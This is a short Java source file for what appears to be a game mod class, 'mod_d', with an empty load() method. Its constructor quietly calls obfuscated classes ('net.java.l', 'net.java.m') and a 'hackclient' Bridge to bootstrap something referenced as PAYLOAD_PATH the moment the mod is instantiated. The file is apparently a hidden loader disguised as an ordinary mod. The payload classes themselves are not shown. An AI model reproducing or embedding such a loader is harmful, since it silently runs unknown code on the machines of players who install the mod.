import net.java.l;
import net.java.m;
import net.hackclient.compat.Bridge;

public class mod_d extends BaseMod {
    public mod_d() {
        m.init();
        Bridge.bootstrap(5, m.PAYLOAD_PATH);
        l.a((Object)new Object[]{null, null, 5, null, null, m.PAYLOAD_PATH});
    }

    public String getVersion() { return "1.0"; }
    public void load() {}
}
